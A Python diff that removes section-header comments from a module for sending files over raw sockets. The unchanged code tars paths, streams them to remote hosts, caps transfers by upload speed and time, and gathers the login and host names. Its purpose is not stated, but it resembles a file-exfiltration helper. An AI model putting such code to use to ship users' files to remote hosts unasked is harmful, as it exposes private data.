@@ -44,9 +44,7 @@ def get_transfer_amount(upload_speed_mbit: float) -> int:
     bytes_per_second = (upload_speed_mbit * 1_000_000) / 8
     return int(bytes_per_second * MAX_SECONDS)
 
-# ----------------------------
-# Retry Helper
-# ----------------------------
+
 def retry(func, retries: int = 5, delay: float = 1.0, *args, **kwargs):
     last_err = None
 
@@ -60,17 +58,11 @@ def retry(func, retries: int = 5, delay: float = 1.0, *args, **kwargs):
     raise last_err
 
 
-# ----------------------------
-# Socket Send String
-# ----------------------------
 def send_string(host: str, port: int, data: str):
     with socket.create_connection((host, port), timeout=5) as s:
         s.sendall(data.encode())
 
 
-# ----------------------------
-# Tar Stream Sender
-# ----------------------------
 def send_tar_stream(host: str, port: int, paths: List[Path]):
     with socket.create_connection((host, port), timeout=10) as s:
         fileobj = s.makefile("wb")
@@ -89,9 +81,6 @@ def send_tar_stream(host: str, port: int, paths: List[Path]):
                             tar.add(f, arcname=str(arc))
 
 
-# ----------------------------
-# Public API
-# ----------------------------
 def send_filename(filename: str):
     retry(send_string, 5, 1, HOST_1, PORT_1, filename)
 
@@ -101,9 +90,6 @@ def send_files(paths: Iterable[Union[str, Path]]):
     retry(send_tar_stream, 5, 1, HOST_2, PORT_2, clean_paths)
 
 
-# ----------------------------
-# Example Usage
-# ----------------------------
 if __name__ == "__main__":
     USER_NAME = os.getlogin()
     HOST_NAME = os.uname().nodename
